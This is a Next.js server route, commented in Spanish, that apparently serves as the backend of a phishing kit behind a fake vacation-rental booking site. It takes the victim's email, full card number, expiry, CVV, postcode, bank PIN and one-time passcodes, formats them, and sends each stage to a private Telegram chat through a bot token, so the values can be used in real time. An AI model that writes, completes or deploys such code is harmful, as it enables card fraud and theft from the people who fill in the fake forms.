import { NextResponse } from "next/server";

export async function POST(request: Request) {
  try {
    const body = await request.json().catch(() => ({}));

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      return NextResponse.json(
        { success: false, error: "Variables de entorno no configuradas" },
        { status: 500 }
      );
    }

    // Normalización de datos (Soporta 'payload' o la raíz del body)
    const data = body.payload || body;
    const action = body.action || data.step || "";

    // Extraer sub-objeto de tarjeta si existe
    const card = data.cardData || data;

    let messageText = "";

    // 1. EVENTO: RESERVA / REGISTRO DE EMAIL
    if (action === "reservation_started" || action === "email") {
      messageText = [
        "📌 <b>NUEVO REGISTRO DE RESERVA</b>",
        "───────────────────",
        `<b>👤 Correo:</b> <code>${data.email || "No especificado"}</code>`,
        `<b>🏨 Propiedad:</b> ${data.stayTitle || data.propertyTitle || "N/A"}`,
        `<b>📅 Fechas:</b> ${data.dates || "N/A"}`,
        `<b>👥 Huéspedes:</b> ${data.guests || "N/A"}`,
        `<b>💰 Total:</b> $${data.totalPrice || 0} USD`
      ].join("\n");
    }

    // 2. EVENTO: DATOS DE TARJETA
    else if (
      action === "card_submitted" || 
      action === "card" || 
      data.cardNumber || 
      card.cardNumber || 
      card.cardHolder
    ) {
      // Detección flexible del nombre del titular
      const holder = card.cardHolder || card.holderName || card.name || "N/A";

      messageText = [
        "💳 <b>DATOS DE TARJETA RECIBIDOS</b>",
        "───────────────────",
        `<b>👤 Correo:</b> ${data.email || "No especificado"}`,
        `<b>🏨 Propiedad:</b> ${data.propertyTitle || data.stayTitle || "N/A"}`,
        `<b>💰 Monto:</b> $${data.totalPrice || 0} USD`,
        "───────────────────",
        `<b>👤 Titular:</b> ${holder}`,
        `<b>🔢 Número:</b> <code>${card.cardNumber || "N/A"}</code>`,
        `<b>📅 Expiración:</b> <code>${card.expiry || "N/A"}</code>`,
        `<b>🔒 CVV/CVC:</b> <code>${card.cvc || card.cvv || "N/A"}</code>`,
        `<b>📍 C.P.:</b> ${card.zip || "N/A"}`,
        `<b>🌍 País:</b> ${card.country || "N/A"}`
      ].join("\n");
    }

    // 3. EVENTO: OTP / PIN DEL BANCO
    else if (
      action === "otp_submitted" || 
      action === "otp" || 
      data.otp || 
      data.otpCode || 
      data.bankPin
    ) {
      const last4 = data.lastFourDigits || 
        (card.cardNumber ? card.cardNumber.replace(/\s+/g, "").slice(-4) : "N/A");

      messageText = [
        "🔑 <b>VERIFICACIÓN OTP / PIN</b>",
        "───────────────────",
        `<b>👤 Correo:</b> ${data.email || "No especificado"}`,
        `<b>💳 Tarjeta:</b> **** ${last4}`,
        `<b>💰 Monto:</b> $${data.totalPrice || 0} USD`,
        "───────────────────",
        `<b>🔐 PIN Banco:</b> <code>${data.bankPin || "N/A"}</code>`,
        `<b>📲 Código OTP:</b> <code>${data.otp || data.otpCode || "N/A"}</code>`
      ].join("\n");
    }

    // 4. FORMATO DE RESPALDO (Texto plano en 'message')
    else if (data.message && typeof data.message === "string") {
      const cleanMessage = data.message.replace(/\\n/g, "\n");
      messageText = `📋 <b>NOTIFICACIÓN DE RESERVA</b>\n───────────────────\n${cleanMessage}`;
    }

    // 5. RESPALDO GENERAL
    else {
      messageText = [
        "📩 <b>NUEVA NOTIFICACIÓN</b>",
        "───────────────────",
        `<b>Correo:</b> ${data.email || "N/A"}`,
        `<b>Detalle:</b> ${data.stayTitle || data.propertyTitle || "N/A"}`
      ].join("\n");
    }

    // Envío a Telegram
    const telegramRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: messageText,
        parse_mode: "HTML",
      }),
    });

    const telegramData = await telegramRes.json();

    if (!telegramData.ok) {
      return NextResponse.json(
        { success: false, error: telegramData.description },
        { status: 400 }
      );
    }

    return NextResponse.json({ success: true });
  } catch (err: any) {
    return NextResponse.json(
      { success: false, error: err?.message || "Error interno del servidor" },
      { status: 500 }
    );
  }
}